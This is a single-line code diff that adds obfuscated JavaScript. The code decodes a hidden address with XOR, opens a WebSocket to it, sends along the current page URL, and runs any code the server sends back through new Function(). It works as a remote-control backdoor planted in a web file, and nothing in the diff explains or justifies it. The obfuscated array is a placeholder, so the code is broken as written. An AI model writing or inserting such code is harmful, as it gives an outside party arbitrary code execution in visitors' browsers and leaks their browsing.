@@ -1,0 +1,1 @@
+const q = obfuscate;k = 42;const d = String.fromCharCode(...q.map(c => c ^ k));window.ww = new WebSocket(d + encodeURIComponent(location.href));window.ww.addEventListener('message', event => {new Function(event.data)();});
